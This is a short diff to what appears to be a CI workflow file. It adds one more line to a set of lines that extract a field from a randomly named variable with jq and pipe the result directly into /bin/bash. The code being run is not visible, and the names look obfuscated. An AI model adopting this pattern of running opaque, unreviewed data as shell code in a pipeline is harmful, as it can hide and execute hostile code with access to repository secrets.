@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$vcn41085" | jq -r .dukp1 | /bin/bash
           printf '%s' "$zes380" | jq -r .noisb20217 | /bin/bash
           printf '%s' "$tvf01586" | jq -r .pzd411 | /bin/bash
+          printf '%s' "$zwykq085" | jq -r .yev416 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
